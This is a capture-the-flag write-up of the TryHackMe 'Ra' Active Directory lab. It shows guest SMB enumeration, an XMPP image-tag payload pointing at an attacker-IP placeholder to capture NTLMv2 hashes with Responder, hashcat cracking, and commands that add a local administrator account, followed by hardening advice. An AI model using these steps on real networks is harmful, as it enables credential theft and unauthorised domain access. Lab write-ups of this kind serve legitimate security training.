# TryHackMe: Ra — Active Directory Exploitation Writeup

## Executive Summary
This report documents the security assessment of **Ra**, an Active Directory domain environment (`WINDCORP`). The attack chain moves from unauthenticated SMB share enumeration to XMPP chat client abuse, capturing NTLMv2 challenge-response hashes via Responder, and conducting Windows privilege escalation analysis.

| Metric | Details |
|---|---|
| **Target Host** | `10.130.168.30` |
| **Domain Name** | `WINDCORP.LOCAL` |
| **Vector Category** | Active Directory / Network Protocol Exploitation |
| **Key Protocols** | SMB, XMPP, DNS, Kerberos, NTLMv2 |

---

## 1. Perimeter Enumeration
An initial port scan identified an Active Directory Domain Controller profile running multiple core services:

| Port | Protocol / Service | Context / Identification |
|---|---|---|
| 53 | DNS | Active Directory Integrated DNS |
| 80 / 443 | HTTP / HTTPS | IIS Web Server |
| 139 / 445 | SMB | NetBIOS / Microsoft-DS |
| 5269 | XMPP | Jabber / Spark Messaging Server |
| 9389 | ADWS | Active Directory Web Services |

---

## 2. SMB Share Enumeration & Client Asset Recovery
Enumerating accessible network shares without authentication revealed readable access to an internal share:

```bash
nxc smb 10.130.168.30 -u 'Guest' -p '' --shares
```

* **Discovered Asset:** The `Shared` directory contained a custom Debian package: `spark_2_8_3.deb`.
* **Analysis:** Spark is an open-source XMPP chat client. Downloading and inspecting the package confirmed that the target enterprise utilizes XMPP for internal employee communication.

---

## 3. XMPP Messaging & NTLMv2 Hash Capture

Using low-privileged account credentials (`lilyle`) discovered during enumeration, a connection was established to the internal XMPP chat server.

### Exploitation Mechanics (Responder Integration)

Many chat clients automatically parse HTML image tags (`<img src="...">`) to generate link previews or inline images.

1. **Setting up the Listener:** Started `Responder` on the VPN interface to listen for inbound authentication requests:
```bash
sudo responder -I tun0 -dwv
```

2. **Injecting Payload:** Sent an inline HTML image payload to active user `buse` over XMPP:
```html
<img src="http://[ATTACKER_VPN_IP]/logo.png">
```

3. **NTLMv2 Capture:** The recipient's client attempted to fetch the image from the attacker's IP, sending an automatic NTLMv2 challenge-response hash.
4. **Offline Hash Cracking:** Captured hashes were extracted and cracked using Hashcat:
```bash
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

## 4. Privilege Escalation & Verification Analysis

During post-exploitation analysis on the Windows target, local group modifications were audited to verify local administrative escalation paths:

```powershell
# Auditing local user creation and group assignment
net user sid [PASSWORD] /add
net localgroup Administrators sid /add
```

### Technical Observation

When verifying privileges, attempts to log in using newly created accounts returned `STATUS_LOGON_FAILURE`. This step highlights a critical auditing principle: **command presence in scripts or files does not guarantee successful system execution**. Privilege escalation must always be verified by checking target event logs (`Event ID 4720` for user creation) and current token elevation levels.

---

## 5. Security Recommendations

* **Disable SMB Guest/Unauthenticated Shares:** Restrict public access to SMB shares containing software installers or client configuration binaries.
* **XMPP / Chat Client Hardening:** Disable automatic HTML render options and remote image fetching in enterprise messaging clients to prevent UNC path/HTTP coercion attacks.
* **Network Segmentation & Outbound Filtering:** Block SMB/HTTP requests directed from internal workstations toward non-corporate/external IP addresses.
* **Enforce NTLMv2 Hardening / Transition to Kerberos:** Require strong password policies to resist offline dictionary cracking and transition toward Kerberos-only authentication where possible.

---

*Author: **Oussama DIMOQRATI***
